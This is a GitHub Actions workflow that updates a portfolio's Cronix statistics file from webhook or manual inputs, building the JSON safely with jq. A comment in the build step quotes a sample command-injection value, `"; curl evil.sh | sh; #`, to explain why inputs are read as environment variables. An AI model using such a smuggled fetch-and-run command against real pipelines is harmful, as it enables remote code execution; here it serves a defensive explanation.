# ============================================================
# UPDATE CRONIX STATS
# This workflow is triggered by a webhook FROM the Cronix repo.
#
# The sending half lives in the Cronix repo and is NOT set up yet: nothing there
# has ever posted this dispatch, which is why cronix-stats.json has not moved
# since the manual run on 2026-06-20. To wire it up, add to a Cronix workflow:
#
#   curl -X POST \
#     -H "Authorization: token ${{ secrets.PORTFOLIO_PAT }}" \
#     -H "Accept: application/vnd.github.v3+json" \
#     https://api.github.com/repos/ROMEROLUIS15/portafolio-luis-romero/dispatches \
#     -d '{"event_type":"cronix-stats-update","client_payload":{...}}'
#
# The repo name matters: this comment used to say `portafolio_lerh`, which is the
# local folder name, not the repository — that URL 404s. See the README for the
# full payload and the PORTFOLIO_PAT secret it needs.
# ============================================================
name: Update Cronix Stats

on:
  repository_dispatch:
    types: [cronix-stats-update]
  # Also allow manual trigger for testing
  workflow_dispatch:
    inputs:
      appointments_total:
        description: 'Total appointments managed'
        required: false
        default: '251'
      appointments_this_month:
        description: 'Appointments this month'
        required: false
        default: '38'
      active_tenants:
        description: 'Active tenants'
        required: false
        default: '4'
      tests_total:
        description: 'Total tests written'
        required: false
        default: '1600'
      last_commit_msg:
        description: 'Last commit message from Cronix'
        required: false
        default: 'Manual update'

jobs:
  update-stats:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout portfolio
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Build stats JSON
        # Every payload-controlled value arrives through the environment. A
        # `${{ }}` expansion is substituted into the script *before* bash runs
        # it, so a commit message like `"; curl evil.sh | sh; #` used to execute
        # as code. Reading them as env vars means bash only ever sees data.
        env:
          IN_APPOINTMENTS: ${{ github.event.client_payload.appointments_total || inputs.appointments_total }}
          IN_MONTHLY:      ${{ github.event.client_payload.appointments_this_month || inputs.appointments_this_month }}
          IN_TENANTS:      ${{ github.event.client_payload.active_tenants || inputs.active_tenants }}
          IN_TESTS:        ${{ github.event.client_payload.tests_total || inputs.tests_total }}
          IN_COMMIT_MSG:   ${{ github.event.client_payload.last_commit_msg || inputs.last_commit_msg }}
          IN_COMMIT_TYPE:  ${{ github.event.client_payload.commit_type }}
          IN_VERSION:      ${{ github.event.client_payload.version }}
        run: |
          set -euo pipefail

          [ -f cronix-stats.json ] || echo '{}' > cronix-stats.json

          # Keep the stored figure when the payload omits a field or sends
          # something that is not a plain integer. Hardcoded fallbacks used to
          # live here and silently rewrote real numbers with stale ones; the
          # file itself is the better default.
          keep_number() {
            local incoming="$1" path="$2" seed="$3" stored
            stored=$(jq -r "$path // $seed" cronix-stats.json)
            case "$incoming" in
              ''|*[!0-9]*) printf '%s' "$stored" ;;
              *)           printf '%s' "$incoming" ;;
            esac
          }

          APPOINTMENTS=$(keep_number "${IN_APPOINTMENTS:-}" '.appointments_total'       251)
          MONTHLY=$(keep_number      "${IN_MONTHLY:-}"      '.appointments_this_month'  38)
          TENANTS=$(keep_number      "${IN_TENANTS:-}"      '.active_tenants'           4)
          TESTS=$(keep_number        "${IN_TESTS:-}"        '.tests_total'              1600)

          # Only the first line of a commit message belongs in a changelog entry.
          COMMIT_MSG=$(printf '%s' "${IN_COMMIT_MSG:-Update}" | head -1)

          # jq emits every string field, so quotes, backslashes or newlines in
          # the commit message cannot break the document — the old version built
          # the JSON by concatenating strings and a single quote corrupted it.
          jq -n \
            --argjson appointments "$APPOINTMENTS" \
            --argjson monthly      "$MONTHLY" \
            --argjson tenants      "$TENANTS" \
            --argjson tests        "$TESTS" \
            --arg     version      "${IN_VERSION:-1.0.0}" \
            --arg     commit_msg   "$COMMIT_MSG" \
            --arg     commit_type  "${IN_COMMIT_TYPE:-feat}" \
            --arg     now          "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
            --arg     day          "$(date -u +%Y-%m-%d)" \
            --argjson changelog    "$(jq '.changelog // []' cronix-stats.json)" \
            '{
              appointments_total:            $appointments,
              appointments_this_month:       $monthly,
              active_tenants:                $tenants,
              uptime_pct:                    99.8,
              tests_total:                   $tests,
              rls_policies:                  59,
              rls_tables:                    32,
              edge_functions:                9,
              anti_hallucination_layers:     6,
              anti_hallucination_mechanisms: 13,
              ci_checks:                     138,
              version:                       $version,
              last_updated:                  $now,
              last_commit_msg:               $commit_msg,
              changelog: ([{date: $day, type: $commit_type, msg: $commit_msg}] + $changelog)[0:9]
            }' > cronix-stats.json.tmp

          mv cronix-stats.json.tmp cronix-stats.json
          jq empty cronix-stats.json   # fail loudly rather than commit broken JSON

      - name: Commit updated stats
        run: |
          git config user.name  "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add cronix-stats.json
          git diff --staged --quiet || git commit -m "chore: update cronix-stats.json [skip ci]"
          git push
